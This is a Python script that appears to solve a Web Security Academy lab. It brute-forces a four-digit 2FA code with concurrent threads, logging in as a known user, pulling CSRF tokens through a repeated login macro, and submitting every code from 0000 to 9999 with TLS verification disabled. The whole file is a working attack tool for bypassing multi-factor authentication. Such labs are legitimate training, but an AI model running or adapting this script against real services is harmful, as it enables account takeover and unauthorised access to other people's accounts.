import requests
import re
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0afa002f03878a9e80876c7d00c100da.web-security-academy.net'  #change the URL here !!!!

found_code = None
valid_session = None
stop_flag = threading.Event()

def run_macro(url, number=0, verbose=True):   #You can disable macros here!!!!
    if verbose:
        print(f'[*] running macro number {number}')
    
    session = requests.Session()
    session.verify = False
    
    #first request : GET /login
    if verbose:
        print('sending GET /login')
    res1 = session.get(f"{url}/login", timeout=5)
    csrf_token = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"', res1.text).group(1)
    if verbose:
        print(f'csrf token = {csrf_token}')
    
    #second request: POST /login
    if verbose:
        print('sending POST /login')
    res2 = session.post(
        url=f'{url}/login',
        data={'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False,
        timeout=5
    ) 
    if verbose:
        print('Login successful')
    
    #third request: GET /login2
    if verbose:
        print('sending GET /login2')
    res3 = session.get(f'{url}/login2', timeout=5)
    csrf_token2 = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"', res3.text).group(1)
    if verbose:
        print(f'csrf_token2 = {csrf_token2}')
    
    
    return csrf_token2, session    #we need csrf_token for 2fa form and the session



def test_2fa_code(guess, thread_id):
    global found_code, stop_flag, valid_session
    
    if stop_flag.is_set():
        return
    
    guess = guess.strip()
    
    for attempt in range(3):
        if stop_flag.is_set():
            return
        
        csrf_token, session = run_macro(url, verbose=False)
        
        print(f'[Thread-{thread_id}] Testing: {guess} (attempt {attempt + 1})')
        
        res = session.post(
            url=f'{url}/login2',
            data={'csrf': csrf_token, 'mfa-code': guess},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
            timeout=5
        )
        
        if res.status_code == 302:
            print(f"[+] FOUND VALID CODE: {guess} (Thread-{thread_id})")
            
            redirect_url = res.headers.get('Location', '/my-account')
            if not redirect_url.startswith('http'):
                redirect_url = url + redirect_url
            
            final_res = session.get(redirect_url, timeout=10)
            if final_res.status_code == 200:
                print(f"[+] SUCCESS! Accessed account with code: {guess}")
                print(f"[+] Account URL: {final_res.url}")
            
            found_code = guess
            valid_session = session
            stop_flag.set()
            return
        elif res.status_code == 400 or 'Invalid CSRF token' in res.text:
            session.close()
            continue
        else:
            session.close()
            break


def bruteforce_2fa(url, code_list, max_workers=15):
    global found_code, stop_flag, valid_session
    
    found_code = None
    valid_session = None
    stop_flag.clear()
    
    print(f'[*] Starting concurrent brute force with {max_workers} threads...')
    
    codes = [code.strip() for code in code_list if code.strip()]
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i, code in enumerate(codes):
            if stop_flag.is_set():
                break
            future = executor.submit(test_2fa_code, code, i % max_workers)
            futures.append(future)
            time.sleep(0.1)
        
        for future in futures:
            if stop_flag.is_set():
                break
            try:
                future.result(timeout=1)
            except:
                continue
    
    return found_code, valid_session


def verify_access(session, code):  # so you don't need to do this manually!!!!
    print(f"[*] Verifying account access with code {code}...")
    account_res = session.get(f'{url}/my-account', timeout=10)
    if account_res.status_code == 200:
        print("[+] Account page accessible!")
        if "carlos" in account_res.text.lower():
            print("[+] Successfully logged in as carlos!") # if you see this => the lab solve



def main():
    print('[*] Starting 2FA brute forcer...')
    
    with open('list.txt', 'r') as f:    # list.txt => (bash -c 'seq -w 0000 9999 > list.txt')
        code_list = f.readlines()
    
    print(f'[*] Loaded {len(code_list)} codes to test')
    
    workers = input("[*] Number of concurrent threads (default 15): ").strip()
    workers = int(workers) if workers.isdigit() else 15
    
    valid_code, valid_session = bruteforce_2fa(url, code_list, workers)
    
    if valid_code and valid_session:
        print(f"\n[+] SUCCESS! 2FA bypass completed!")
        print(f"[+] Valid code was: {valid_code}")
        verify_access(valid_session, valid_code)
    else:
        print("[-] No valid 2FA code found")

if __name__ == '__main__':
    main()
